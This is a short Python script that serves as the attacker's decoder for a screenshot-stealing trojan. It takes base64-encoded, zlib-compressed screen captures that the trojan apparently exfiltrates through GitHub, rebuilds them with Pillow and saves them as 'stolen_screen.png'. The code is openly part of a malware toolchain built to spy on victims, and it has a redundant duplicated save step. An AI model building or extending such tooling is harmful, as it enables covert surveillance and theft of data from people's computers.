import base64
import zlib
import json
import sys
from PIL import Image

# Usage: python3 decrypt.py trojan_output.txt

input_file = sys.argv[1]
output_file = "stolen_screen.png"  # We will save as PNG now

with open(input_file, 'r') as f:
    # 1. Read the raw text from the file
    raw_content = f.read()

    # 2. Decode the GitHub "Transport Layer" (Base64)
    # The trojan.py encodes the whole string once before sending
    json_str = base64.b64decode(raw_content).decode('utf-8')

    # 3. Parse the JSON to get Width, Height, and Data
    packet = json.loads(json_str)
    width = packet['width']
    height = packet['height']
    data_str = packet['data']

    print(f"[*] Found image dimensions: {width} x {height}")

    # 4. Decode the Image Data
    compressed_bytes = base64.b64decode(data_str)
    raw_pixels = zlib.decompress(compressed_bytes)

    # 5. Reconstruct the Image using Pillow
    image = Image.frombytes("RGBX", (width, height), raw_pixels)

    # NEW: Convert RGBX to standard RGB so PNG can handle it
    image = image.convert("RGB")

    # 6. Save as a proper PNG (Use .png extension)
    image.save("stolen_screen.png")
    print(f"[*] Success! Saved screenshot to stolen_screen.png")

    # 6. Save as a proper PNG
    image.save(output_file)
    print(f"[*] Success! Saved screenshot to {output_file}")
